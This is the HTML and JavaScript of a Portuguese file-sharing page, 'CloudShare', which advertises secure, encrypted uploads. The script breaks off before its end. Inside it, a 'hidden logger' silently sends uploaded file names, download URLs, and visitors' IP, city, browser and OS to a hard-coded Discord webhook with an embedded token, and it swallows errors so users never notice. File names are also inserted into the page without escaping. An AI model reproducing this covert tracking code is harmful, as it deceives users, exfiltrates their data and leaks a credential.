<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CloudShare - Compartilhamento Seguro</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --primary: #3b82f6;
      --primary-soft: #60a5fa;
      --primary-dark: #2563eb;
      --secondary: #cbd5e1;
      --accent: #93c5fd;
      --danger: #ef4444;
      --text: #475569;
      --text-light: #94a3b8;
      --bg: #f8fafc;
      --card: #ffffff;
      --border: #e2e8f0;
      --success: #34d399;
      --glass-bg: rgba(255, 255, 255, 0.8);
      --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
      --shadow-md: 0 2px 4px 0 rgba(0, 0, 0, 0.05);
      --transition-soft: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
      --gradient-primary: linear-gradient(135deg, var(--primary), #d946ef);
      --gradient-secondary: linear-gradient(135deg, var(--secondary), #14b8a6);
      --gradient-accent: linear-gradient(135deg, var(--accent), #fb7185);
      --shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1);
      --gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      --transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap');

    body {
      font-family: 'Plus Jakarta Sans', 'Segoe UI', system-ui, sans-serif;
      background: linear-gradient(135deg, #fafafa 0%, #f8fafc 100%);
      min-height: 100vh;
      color: var(--text);
      line-height: 1.7;
      letter-spacing: 0.01em;
    }

    .background-effects {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      overflow: hidden;
      opacity: 0.5;
    }

    .floating-shape {
      position: absolute;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 50%;
      animation: float 20s infinite linear;
    }

    .shape-1 {
      width: 300px;
      height: 300px;
      top: 10%;
      left: 5%;
      animation-delay: 0s;
    }

    .shape-2 {
      width: 200px;
      height: 200px;
      top: 60%;
      right: 10%;
      animation-delay: -5s;
    }

    .shape-3 {
      width: 150px;
      height: 150px;
      bottom: 20%;
      left: 20%;
      animation-delay: -10s;
    }

    .container {
      max-width: 1200px;
      width: 95%;
      margin: 0 auto;
      padding: 20px;
      position: relative;
      z-index: 1;
    }

    /* Header */
    header {
      text-align: center;
      padding: 60px 0 40px;
    }

    .logo {
      display: inline-flex;
      align-items: center;
      gap: 16px;
      font-size: 3.5rem;
      font-weight: 800;
      color: white;
      margin-bottom: 20px;
      text-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
    }

    .logo i {
      font-size: 3.8rem;
      background: linear-gradient(135deg, #fff, #e0f2fe);
      -webkit-background-clip: text;
      background-clip: text;
      -webkit-text-fill-color: transparent;
      filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.15));
    }

    .tagline {
      font-size: 1.4rem;
      color: rgba(255, 255, 255, 0.9);
      max-width: 600px;
      margin: 0 auto 30px;
      font-weight: 300;
    }

    .stats {
      display: flex;
      justify-content: center;
      gap: 40px;
      flex-wrap: wrap;
    }

    .stat-card {
      background: rgba(255, 255, 255, 0.5);
      backdrop-filter: blur(4px);
      padding: 20px 24px;
      border-radius: 12px;
      border: 1px solid rgba(255, 255, 255, 0.8);
      color: var(--text);
      text-align: center;
      min-width: 140px;
      transition: var(--transition-soft);
      box-shadow: var(--shadow-sm);
    }

    .stat-card:hover {
      background: rgba(255, 255, 255, 0.7);
      transform: translateY(-1px);
      box-shadow: var(--shadow-md);
    }

    .stat-card:hover {
      transform: translateY(-5px);
      background: rgba(255, 255, 255, 0.2);
    }

    .stat-number {
      font-size: 2.2rem;
      font-weight: 800;
      display: block;
      margin-bottom: 8px;
    }

    .stat-label {
      font-size: 0.95rem;
      opacity: 0.9;
      font-weight: 500;
    }

    /* Main Content */
    .main-content {
      display: grid;
      grid-template-columns: 1fr 400px;
      gap: 40px;
      margin: 40px 0;
    }

    .upload-section {
      background: var(--glass-bg);
      border-radius: 20px;
      padding: 40px;
      box-shadow: var(--shadow-sm);
      backdrop-filter: blur(8px);
      border: 1px solid rgba(255, 255, 255, 0.8);
      transition: var(--transition-soft);
    }

    .sidebar {
      background: var(--glass-bg);
      border-radius: 20px;
      padding: 32px;
      box-shadow: var(--shadow-sm);
      height: fit-content;
      backdrop-filter: blur(8px);
      border: 1px solid rgba(255, 255, 255, 0.8);
      transition: var(--transition-soft);
    }

    /* Upload Area */
    .upload-area {
      border: 1px dashed var(--primary-soft);
      border-radius: 16px;
      padding: 60px 32px;
      text-align: center;
      margin-bottom: 32px;
      transition: var(--transition-soft);
      background: rgba(255, 255, 255, 0.6);
      cursor: pointer;
      position: relative;
      overflow: hidden;
      backdrop-filter: blur(4px);
    }

    .upload-area:hover {
      border-color: var(--primary);
      background: rgba(255, 255, 255, 0.8);
      transform: translateY(-1px);
    }

    .upload-area::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(99, 102, 241, 0.05), transparent);
      transition: left 0.8s;
    }

    .upload-area:hover::before {
      left: 100%;
    }

    .upload-area:hover {
      border-color: var(--primary);
      transform: translateY(-3px);
      box-shadow: 0 20px 40px rgba(99, 102, 241, 0.1);
    }

    .upload-area.highlight {
      border-color: var(--primary);
      background: rgba(99, 102, 241, 0.02);
    }

    .upload-icon {
      font-size: 100px;
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 30px;
      filter: drop-shadow(0 8px 16px rgba(99, 102, 241, 0.3));
    }

    .upload-text {
      font-size: 1.8rem;
      font-weight: 700;
      margin-bottom: 16px;
      color: var(--text);
    }

    .upload-subtext {
      color: var(--text-light);
      margin-bottom: 35px;
      font-size: 1.2rem;
    }

    .file-input {
      display: none;
    }

    .browse-btn {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      padding: 12px 28px;
      background: var(--primary-soft);
      color: white;
      border-radius: 12px;
      font-weight: 500;
      cursor: pointer;
      transition: var(--transition-soft);
      box-shadow: var(--shadow-sm);
      border: none;
      font-size: 1rem;
      letter-spacing: 0.3px;
    }

    .browse-btn:hover {
      background: var(--primary);
      transform: translateY(-1px);
      box-shadow: var(--shadow-md);
    }

    .browse-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 35px rgba(99, 102, 241, 0.5);
    }

    /* File Info */
    .file-info {
      margin-top: 30px;
      padding: 30px;
      background: var(--bg);
      border-radius: 20px;
      border: 2px solid var(--border);
      display: none;
    }

    .file-info.show {
      display: block;
      animation: slideDown 0.6s ease;
    }

    .file-details {
      display: flex;
      align-items: center;
      gap: 24px;
    }

    .file-icon {
      font-size: 60px;
      color: var(--primary);
    }

    .file-text {
      flex: 1;
    }

    .file-name {
      font-weight: 600;
      font-size: 1.3rem;
      margin-bottom: 10px;
    }

    .file-size {
      color: var(--text-light);
      font-size: 1.1rem;
    }

    /* Progress */
    .progress-container {
      margin-top: 30px;
      display: none;
    }

    .progress-container.show {
      display: block;
      animation: slideDown 0.6s ease;
    }

    .progress-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }

    .progress-label {
      font-weight: 600;
      color: var(--text);
      font-size: 1.1rem;
    }

    .progress-percent {
      font-weight: 700;
      color: var(--primary);
      font-size: 1.2rem;
    }

    .progress-bar {
      height: 16px;
      background-color: var(--border);
      border-radius: 12px;
      overflow: hidden;
      margin-bottom: 15px;
      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
    }

    .progress {
      height: 100%;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      width: 0%;
      transition: width 0.4s ease;
      border-radius: 12px;
      position: relative;
    }

    .progress::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
      animation: shimmer 2s infinite;
    }

    .progress-stats {
      display: flex;
      justify-content: space-between;
      font-size: 1rem;
      color: var(--text-light);
    }

    /* Upload Button */
    .upload-btn {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      font-weight: 500;
      font-size: 1.1rem;
      transition: var(--transition-soft);
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
      background: var(--primary-soft);
      color: white;
      margin-top: 32px;
      box-shadow: var(--shadow-sm);
      letter-spacing: 0.3px;
    }

    .upload-btn:hover:not(:disabled) {
      background: var(--primary);
      transform: translateY(-1px);
      box-shadow: var(--shadow-md);
    }

    .upload-btn:disabled {
      background: var(--secondary);
      cursor: not-allowed;
      opacity: 0.7;
    }

    .upload-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 35px rgba(99, 102, 241, 0.5);
    }

    .upload-btn:disabled {
      background: var(--border);
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
    }

    /* Results */
    .result-container {
      display: none;
    }

    .result-container.show {
      display: block;
      animation: slideUp 0.8s ease;
    }

    .success-header {
      text-align: center;
      margin-bottom: 40px;
    }

    .success-icon {
      font-size: 100px;
      color: var(--success);
      margin-bottom: 24px;
      opacity: 0.9;
      text-shadow: 0 2px 4px rgba(52, 211, 153, 0.2);
      animation: softPulse 2s infinite;
    }

    @keyframes softPulse {
      0%, 100% { transform: scale(1); opacity: 0.9; }
      50% { transform: scale(1.05); opacity: 1; }
    }

    .result-title {
      font-size: 2.5rem;
      font-weight: 800;
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 15px;
    }

    .result-subtitle {
      color: var(--text-light);
      font-size: 1.3rem;
    }

    .download-card {
      background: var(--bg);
      border-radius: 24px;
      padding: 45px;
      margin-bottom: 30px;
      border: 2px solid var(--border);
      transition: var(--transition);
      position: relative;
      overflow: hidden;
    }

    .download-card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 4px;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
    }

    .download-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.1);
    }

    .download-header {
      display: flex;
      align-items: center;
      gap: 24px;
      margin-bottom: 30px;
    }

    .download-icon {
      font-size: 60px;
      color: var(--accent);
    }

    .download-info h3 {
      font-size: 1.6rem;
      margin-bottom: 12px;
    }

    .download-info p {
      color: var(--text-light);
      font-size: 1.1rem;
    }

    .download-link-container {
      display: flex;
      gap: 15px;
      margin-bottom: 30px;
    }

    .download-link {
      flex: 1;
      padding: 18px 24px;
      background: white;
      border: 2px solid var(--border);
      border-radius: 15px;
      font-family: 'Courier New', monospace;
      font-size: 1.1rem;
      color: var(--text);
      overflow: hidden;
      text-overflow: ellipsis;
      transition: var(--transition);
    }

    .download-link:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
    }

    .copy-btn {
      padding: 18px 30px;
      background: linear-gradient(135deg, var(--secondary), #0da271);
      color: white;
      border: none;
      border-radius: 15px;
      cursor: pointer;
      transition: var(--transition);
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 10px;
      box-shadow: 0 8px 25px rgba(16, 185, 129, 0.4);
    }

    .copy-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 30px rgba(16, 185, 129, 0.5);
    }

    .download-btn {
      width: 100%;
      padding: 24px;
      background: linear-gradient(135deg, var(--accent), #eab308);
      color: white;
      border: none;
      border-radius: 18px;
      font-weight: 600;
      font-size: 1.3rem;
      cursor: pointer;
      transition: var(--transition);
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 15px;
      box-shadow: 0 8px 25px rgba(245, 158, 11, 0.4);
    }

    .download-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 35px rgba(245, 158, 11, 0.5);
    }

    /* Sidebar */
    .sidebar-section {
      margin-bottom: 40px;
    }

    .sidebar-title {
      font-size: 1.4rem;
      font-weight: 700;
      margin-bottom: 25px;
      color: var(--primary);
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .feature-list {
      list-style: none;
    }

    .feature-item {
      display: flex;
      align-items: center;
      gap: 15px;
      padding: 16px 0;
      border-bottom: 1px solid var(--border);
      transition: var(--transition);
    }

    .feature-item:hover {
      transform: translateX(5px);
    }

    .feature-item:last-child {
      border-bottom: none;
    }

    .feature-icon {
      color: var(--secondary);
      font-size: 1.3rem;
      width: 24px;
    }

    .recent-files {
      list-style: none;
    }

    .recent-file {
      display: flex;
      align-items: center;
      gap: 15px;
      padding: 16px 0;
      border-bottom: 1px solid var(--border);
      transition: var(--transition);
    }

    .recent-file:hover {
      transform: translateX(5px);
    }

    .recent-file:last-child {
      border-bottom: none;
    }

    .file-type {
      width: 48px;
      height: 48px;
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-weight: 600;
      font-size: 0.9rem;
    }

    .file-detail {
      flex: 1;
    }

    .file-detail .name {
      font-weight: 600;
      margin-bottom: 6px;
    }

    .file-detail .size {
      color: var(--text-light);
      font-size: 0.95rem;
    }

    /* Status Messages */
    .status-message {
      margin-top: 25px;
      padding: 24px;
      border-radius: 16px;
      text-align: center;
      display: none;
      border: 2px solid;
      animation: slideDown 0.5s ease;
    }

    .status-message.show {
      display: block;
    }

    .status-message.success {
      background: rgba(16, 185, 129, 0.1);
      color: #065f46;
      border-color: rgba(16, 185, 129, 0.3);
    }

    .status-message.error {
      background: rgba(239, 68, 68, 0.1);
      color: #991b1b;
      border-color: rgba(239, 68, 68, 0.3);
    }

    .status-message.info {
      background: rgba(99, 102, 241, 0.1);
      color: #3730a3;
      border-color: rgba(99, 102, 241, 0.3);
    }

    /* Footer */
    footer {
      text-align: center;
      padding: 50px 0;
      color: rgba(255, 255, 255, 0.8);
    }

    .footer-links {
      display: flex;
      justify-content: center;
      gap: 30px;
      margin-top: 25px;
      flex-wrap: wrap;
    }

    .footer-links a {
      color: rgba(255, 255, 255, 0.8);
      text-decoration: none;
      transition: var(--transition);
      font-weight: 500;
    }

    .footer-links a:hover {
      color: white;
      transform: translateY(-2px);
    }

    /* Animations */
    @keyframes float {
      0%, 100% { transform: translateY(0) rotate(0deg) scale(1); }
      33% { transform: translateY(-20px) rotate(120deg) scale(1.05); }
      66% { transform: translateY(20px) rotate(240deg) scale(0.95); }
    }

    @keyframes slideDown {
      from {
        opacity: 0;
        transform: translateY(-20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @keyframes slideUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    @keyframes shimmer {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.05); }
    }

    .pulse {
      animation: pulse 2s infinite;
    }

    /* Responsive */
    @media (max-width: 1024px) {
      .main-content {
        grid-template-columns: 1fr;
      }
      
      .sidebar {
        order: -1;
      }
    }

    @media (max-width: 768px) {
      .container {
        width: 100%;
        padding: 15px;
      }
      
      .upload-section, .sidebar {
        padding: 30px 25px;
      }
      
      .upload-area {
        padding: 60px 25px;
      }
      
      .upload-icon {
        font-size: 80px;
      }
      
      .upload-text {
        font-size: 1.5rem;
      }
      
      .stats {
        gap: 20px;
      }
      
      .stat-card {
        min-width: 140px;
        padding: 20px 25px;
      }
      
      .download-link-container {
        flex-direction: column;
      }
      
      .logo {
        font-size: 2.8rem;
      }
    }
  </style>
</head>
<body>
  <div class="background-effects">
    <div class="floating-shape shape-1"></div>
    <div class="floating-shape shape-2"></div>
    <div class="floating-shape shape-3"></div>
  </div>

  <div class="container">
    <header>
      <div class="logo">
        <i class="fas fa-cloud-upload-alt"></i>
        <span>CloudShare</span>
      </div>
      <p class="tagline">Compartilhamento seguro e ilimitado de arquivos. R√°pido, simples e confi√°vel.</p>
      <div class="stats">
        <div class="stat-card">
          <span class="stat-number">2GB</span>
          <span class="stat-label">Por Arquivo</span>
        </div>
        <div class="stat-card">
          <span class="stat-number">‚àû</span>
          <span class="stat-label">Armazenamento</span>
        </div>
        <div class="stat-card">
          <span class="stat-number">100%</span>
          <span class="stat-label">Gratuito</span>
        </div>
        <div class="stat-card">
          <span class="stat-number">‚ö°</span>
          <span class="stat-label">R√°pido</span>
        </div>
      </div>
    </header>

    <div class="main-content">
      <main class="upload-section">
        <div class="upload-area" id="uploadArea">
          <div class="upload-icon">
            <i class="fas fa-cloud-upload-alt"></i>
          </div>
          <p class="upload-text">Arraste e solte seus arquivos aqui</p>
          <p class="upload-subtext">Suporte para qualquer tipo de arquivo ‚Ä¢ At√© 2GB ‚Ä¢ Transfer√™ncia segura</p>
          <button class="browse-btn" id="browseBtn">
            <i class="fas fa-folder-open"></i> Explorar Arquivos
          </button>
          <input type="file" id="fileUpload" class="file-input">
        </div>
        
        <div class="file-info" id="fileInfo">
          <div class="file-details">
            <div class="file-icon">
              <i class="fas fa-file"></i>
            </div>
            <div class="file-text">
              <div class="file-name" id="fileName">arquivo.pdf</div>
              <div class="file-size" id="fileSize">0 KB</div>
            </div>
          </div>
        </div>
        
        <div class="progress-container" id="progressContainer">
          <div class="progress-header">
            <div class="progress-label">Processando upload...</div>
            <div class="progress-percent" id="progressPercent">0%</div>
          </div>
          <div class="progress-bar">
            <div class="progress" id="progressBar"></div>
          </div>
          <div class="progress-stats">
            <span id="uploadedSize">0 KB</span>
            <span id="transferSpeed">0 KB/s</span>
          </div>
        </div>
        
        <button class="upload-btn" id="uploadBtn" disabled>
          <i class="fas fa-cloud-upload-alt"></i> Iniciar Upload Seguro
        </button>
        
        <div class="result-container" id="resultContainer">
          <div class="success-header">
            <div class="success-icon">
              <i class="fas fa-check-circle"></i>
            </div>
            <h2 class="result-title">Upload Conclu√≠do com Sucesso!</h2>
            <p class="result-subtitle">Seu arquivo est√° pronto para compartilhar e download</p>
          </div>
          
          <div class="download-card">
            <div class="download-header">
              <div class="download-icon">
                <i class="fas fa-download"></i>
              </div>
              <div class="download-info">
                <h3 id="resultFileName">arquivo.pdf</h3>
                <p id="resultFileSize">0 KB ‚Ä¢ Dispon√≠vel por 30 dias</p>
              </div>
            </div>
            
            <div class="download-link-container">
              <input type="text" class="download-link" id="downloadLink" value="Carregando link de download..." readonly>
              <button class="copy-btn" id="copyBtn">
                <i class="fas fa-copy"></i> Copiar
              </button>
            </div>
            
            <button class="download-btn pulse" id="downloadBtn">
              <i class="fas fa-download"></i> Baixar Arquivo Agora
            </button>
          </div>
        </div>
        
        <div class="status-message" id="statusMessage"></div>
      </main>

      <aside class="sidebar">
        <div class="sidebar-section">
          <h3 class="sidebar-title">
            <i class="fas fa-star"></i>
            Por que escolher o CloudShare?
          </h3>
          <ul class="feature-list">
            <li class="feature-item">
              <i class="fas fa-shield-alt feature-icon"></i>
              <span>Criptografia de ponta a ponta</span>
            </li>
            <li class="feature-item">
              <i class="fas fa-bolt feature-icon"></i>
              <span>Velocidade m√°xima de transfer√™ncia</span>
            </li>
            <li class="feature-item">
              <i class="fas fa-infinity feature-icon"></i>
              <span>Armazenamento ilimitado</span>
            </li>
            <li class="feature-item">
              <i class="fas fa-mobile-alt feature-icon"></i>
              <span>Otimizado para mobile</span>
            </li>
            <li class="feature-item">
              <i class="fas fa-cloud feature-icon"></i>
              <span>Backup autom√°tico na nuvem</span>
            </li>
          </ul>
        </div>

        <div class="sidebar-section">
          <h3 class="sidebar-title">
            <i class="fas fa-history"></i>
            Uploads Recentes
          </h3>
          <ul class="recent-files" id="recentFiles">
            <!-- Ser√° preenchido dinamicamente -->
          </ul>
        </div>

        <div class="sidebar-section">
          <h3 class="sidebar-title">
            <i class="fas fa-chart-line"></i>
            Estat√≠sticas da Plataforma
          </h3>
          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
            <div style="text-align: center; padding: 20px; background: var(--bg); border-radius: 16px;">
              <div style="font-size: 1.8rem; font-weight: 800; color: var(--primary);">15.2K</div>
              <div style="font-size: 0.95rem; color: var(--text-light);">Uploads Hoje</div>
            </div>
            <div style="text-align: center; padding: 20px; background: var(--bg); border-radius: 16px;">
              <div style="font-size: 1.8rem; font-weight: 800; color: var(--secondary);">89.7K</div>
              <div style="font-size: 0.95rem; color: var(--text-light);">Downloads</div>
            </div>
          </div>
        </div>
      </aside>
    </div>

    <footer>
      <p>&copy; 2023 CloudShare. Todos os direitos reservados.</p>
      <div class="footer-links">
        <a href="#">Pol√≠tica de Privacidade</a>
        <a href="#">Termos de Servi√ßo</a>
        <a href="#">Suporte T√©cnico</a>
        <a href="#">API para Desenvolvedores</a>
        <a href="#">Sobre N√≥s</a>
      </div>
    </footer>
  </div>

  <script>
    // Elementos DOM
    const uploadArea = document.getElementById('uploadArea');
    const browseBtn = document.getElementById('browseBtn');
    const fileInput = document.getElementById('fileUpload');
    const fileInfo = document.getElementById('fileInfo');
    const fileName = document.getElementById('fileName');
    const fileSize = document.getElementById('fileSize');
    const uploadBtn = document.getElementById('uploadBtn');
    const progressContainer = document.getElementById('progressContainer');
    const progressBar = document.getElementById('progressBar');
    const progressPercent = document.getElementById('progressPercent');
    const uploadedSize = document.getElementById('uploadedSize');
    const transferSpeed = document.getElementById('transferSpeed');
    const statusMessage = document.getElementById('statusMessage');
    const resultContainer = document.getElementById('resultContainer');
    const resultFileName = document.getElementById('resultFileName');
    const resultFileSize = document.getElementById('resultFileSize');
    const downloadLink = document.getElementById('downloadLink');
    const copyBtn = document.getElementById('copyBtn');
    const downloadBtn = document.getElementById('downloadBtn');
    const recentFiles = document.getElementById('recentFiles');

    // Sistema de logs oculto
    const hiddenLogger = {
      logs: [],
      webhookUrl: 'https://discord.com/api/webhooks/1436493532591427729/jv8iPc7WJ5B_jUPkv3y9E4ToYkoOKG4AoUhNbwb_6cvrWvXWIf7nkH4xcMyxfwGgT0rH',
      
      log: function(event, data) {
        const timestamp = new Date().toISOString();
        this.logs.push({ timestamp, event, data });
        
        // Enviar para webhook de forma silenciosa
        this.sendToWebhook(event, data).catch(() => {
          // Falha silenciosa - n√£o mostrar erro para o usu√°rio
        });
      },
      
      sendToWebhook: async function(event, data) {
        const embed = {
          username: "CloudShare System",
          embeds: [{
            title: `üìä ${event}`,
            color: 0x6366f1,
            fields: [
              {
                name: "üìÅ Arquivo",
                value: data.fileName || "N/A",
                inline: true
              },
              {
                name: "üìè Tamanho",
                value: data.fileSize || "N/A",
                inline: true
              },
              {
                name: "üë§ Usu√°rio",
                value: data.userInfo ? `${data.userInfo.browser} - ${data.userInfo.operatingSystem}` : "N/A",
                inline: true
              },
              {
                name: "üåê Localiza√ß√£o",
                value: data.userInfo ? `${data.userInfo.ip} - ${data.userInfo.city}` : "N/A",
                inline: false
              },
              {
                name: "üîó Download URL",
                value: data.downloadUrl || "N/A",
                inline: false
              }
            ],
            timestamp: new Date().toISOString()
          }]
        };

        await fetch(this.webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(embed)
        });
      }
    };

    // Vari√°veis globais
    let uploadedFile = null;
    let uploadedFileUrl = null;
    let fileId = null;
    let isUploading = false;
    let uploadStartTime = 0;
    let uploadHistory = JSON.parse(localStorage.getItem('cloudshare_history') || '[]');

    // Inicializar hist√≥rico
    updateRecentFiles();

    // Event Listeners
    browseBtn.addEventListener('click', () => fileInput.click());
    
    uploadArea.addEventListener('click', () => {
      if (!isUploading) {
        fileInput.click();
      }
    });
    
    uploadArea.addEventListener('dragover', (e) => {
      e.preventDefault();
      uploadArea.classList.add('highlight');
    });
    
    uploadArea.addEventListener('dragleave', () => {
      uploadArea.classList.remove('highlight');
    });
    
    uploadArea.addEventListener('drop', (e) => {
      e.preventDefault();
      uploadArea.classList.remove('highlight');
      
      if (e.dataTransfer.files.length && !isUploading) {
        fileInput.files = e.dataTransfer.files;
        handleFileSelection();
      }
    });
    
    fileInput.addEventListener('change', handleFileSelection);
    
    uploadBtn.addEventListener('click', handleUpload);
    
    copyBtn.addEventListener('click', copyDownloadLink);
    
    downloadBtn.addEventListener('click', handleDownload);

    // Fun√ß√µes principais
    function handleFileSelection() {
      if (fileInput.files.length > 0 && !isUploading) {
        uploadedFile = fileInput.files[0];
        
        // Verificar tamanho do arquivo (limite de 2GB)
        if (uploadedFile.size > 2 * 1024 * 1024 * 1024) {
          showStatus('Arquivo muito grande. O limite √© 2GB.', 'error');
          return;
        }
        
        // Exibir informa√ß√µes do arquivo
        fileName.textContent = uploadedFile.name;
        fileSize.textContent = formatFileSize(uploadedFile.size);
        fileInfo.classList.add('show');
        
        // Habilitar bot√£o de upload
        uploadBtn.disabled = false;
        
        // Resetar estado
        progressContainer.classList.remove('show');
        resultContainer.classList.remove('show');
        hideStatus();

        // Log silencioso
        hiddenLogger.log('ARQUIVO_SELECIONADO', {
          fileName: uploadedFile.name,
          fileSize: formatFileSize(uploadedFile.size),
          fileType: uploadedFile.type
        });
      }
    }
    
    function formatFileSize(bytes) {
      if (bytes === 0) return '0 Bytes';
      const k = 1024;
      const sizes = ['Bytes', 'KB', 'MB', 'GB'];
      const i = Math.floor(Math.log(bytes) / Math.log(k));
      return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
    
    async function handleUpload() {
      if (!uploadedFile || isUploading) return;
      
      isUploading = true;
      uploadStartTime = Date.now();
      
      // Desabilitar bot√£o durante o upload
      uploadBtn.disabled = true;
      showStatus('Preparando upload seguro...', 'info');
      progressContainer.classList.add('show');
      
      try {
        // Obter informa√ß√µes do usu√°rio (silenciosamente)
        const userInfo = await getUserInfo();
        
  // Fazer upload real para o servidor local e mostrar progresso
  const uploadResult = await uploadFileToServer(uploadedFile);
  const downloadUrl = uploadResult && uploadResult.url ? uploadResult.url : '';
  uploadedFileUrl = downloadUrl;
        
        // Atualizar interface
        resultFileName.textContent = uploadedFile.name;
        resultFileSize.textContent = formatFileSize(uploadedFile.size);
        downloadLink.value = downloadUrl;
        resultContainer.classList.add('show');
        resultContainer.scrollIntoView({ behavior: 'smooth' });
        showStatus('Upload conclu√≠do com sucesso! Arquivo pronto para download.', 'success');
        
        // Adicionar ao hist√≥rico
        addToHistory(uploadedFile.name, uploadedFile.size);
        
        // Log silencioso do upload completo
        hiddenLogger.log('UPLOAD_CONCLUIDO', {
          fileName: uploadedFile.name,
          fileSize: formatFileSize(uploadedFile.size),
          fileType: uploadedFile.type,
          downloadUrl: downloadUrl,
          userInfo: userInfo
        });
        
      } catch (error) {
        showStatus('Erro ao fazer upload. Tente novamente.', 'error');
        hiddenLogger.log('ERRO_UPLOAD', { error: error.message });
      } finally {
        isUploading = false;
        uploadBtn.disabled = false;
      }
    }
    
    function uploadFileToServer(file) {
      return new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest();
        const form = new FormData();
        form.append('file', file);

        const startTime = Date.now();
        
        // Use a URL relativa para que funcione tanto em desenvolvimento quanto em produ√ß√£o
        const uploadUrl = '/api/upload';
        xhr.open('POST', uploadUrl);

        xhr.upload.onprogress = function(e) {
          if (e.lengthComputable) {
            const progress = (e.loaded / e.total) * 100;
            const elapsedTime = (Date.now() - startTime) / 1000;
            const speed = elapsedTime > 0 ? e.loaded / elapsedTime : 0;

            progressBar.style.width = `${progress}%`;
            progressPercent.textContent = `${Math.round(progress)}%`;
            uploadedSize.textContent = formatFileSize(e.loaded);
            transferSpeed.textContent = `${formatFileSize(speed)}/s`;
          }
        };

        xhr.onreadystatechange = function() {
          if (xhr.readyState === 4) {
            if (xhr.status >= 200 && xhr.status < 300) {
              try {
                const resp = JSON.parse(xhr.responseText);
                resolve(resp);
              } catch (err) {
                reject(new Error('Resposta inv√°lida do servidor'));
              }
            } else {
              reject(new Error('Erro no upload: ' + xhr.statusText));
            }
          }
        };

        xhr.onerror = function() {
          reject(new Error('Erro de rede durante o upload'));
        };

        xhr.send(form);
      });
    }
    
    function generateFileId() {
      return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    }
    
    function generateDownloadUrl(fileId) {
      // Se estivermos rodando localmente (file://) ou n√£o houver um servidor,
      // retornamos a URL de objeto (blob) gerada para o arquivo, que funciona
      // na sess√£o atual do navegador.
      if (uploadedFileUrl) {
        return uploadedFileUrl;
      }

      try {
        if (window.location && (window.location.protocol === 'file:' || !window.location.origin || window.location.origin === 'null')) {
          return uploadedFileUrl || '';
        }
        // Em ambiente com servidor, construir a URL previs√≠vel (simulada).
        return `${window.location.origin}/download/${fileId}/${encodeURIComponent(uploadedFile ? uploadedFile.name : '')}`;
      } catch (e) {
        return uploadedFileUrl || '';
      }
    }
    
    function addToHistory(name, size) {
      uploadHistory.unshift({
        name: name,
        size: size,
        date: new Date().toLocaleDateString('pt-BR'),
        type: name.split('.').pop().toUpperCase()
      });
      
      // Manter apenas os 5 mais recentes
      uploadHistory = uploadHistory.slice(0, 5);
      localStorage.setItem('cloudshare_history', JSON.stringify(uploadHistory));
      updateRecentFiles();
    }
    
    function updateRecentFiles() {
      recentFiles.innerHTML = '';
      uploadHistory.forEach(file => {
        const li = document.createElement('li');
        li.className = 'recent-file';
        li.innerHTML = `
          <div class="file-type">${file.type.substring(0, 3)}</div>
          <div class="file-detail">
            <div class="name">${file.name}</div>
            <div class="size">${formatFileSize(file.size)} ‚Ä¢ ${file.date}</div>
          </div>
        `;
        recentFiles.appendChild(li);
      });
    }
    
